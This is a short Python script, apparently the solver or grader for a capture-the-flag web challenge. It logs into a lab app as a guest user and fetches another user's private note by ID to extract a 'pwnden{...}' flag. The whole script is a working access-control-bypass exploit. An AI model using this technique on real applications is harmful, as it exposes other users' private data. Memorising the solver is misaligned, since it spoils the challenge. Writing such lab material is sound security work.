from http.cookiejar import CookieJar
import json
import re
import sys
from urllib.error import HTTPError
from urllib.request import HTTPCookieProcessor, Request, build_opener


def solve():
    client = build_opener(HTTPCookieProcessor(CookieJar()))
    login = Request(
        "http://app:8000/login",
        data=json.dumps({"username": "guest", "password": "guest"}).encode(),
        headers={"Content-Type": "application/json"},
    )
    with client.open(login, timeout=5) as response:
        assert response.status == 200
    try:
        with client.open("http://app:8000/api/notes/2", timeout=5) as response:
            flag = json.load(response)["body"]
    except HTTPError as error:
        if error.code == 404:
            print("private note access denied: HTTP 404", file=sys.stderr)
            raise SystemExit(3) from None
        raise
    if re.fullmatch(r"pwnden\{[0-9a-f]{32}\}", flag) is None:
        raise SystemExit("private note did not contain the run flag")
    print(flag)


if __name__ == "__main__":
    solve()
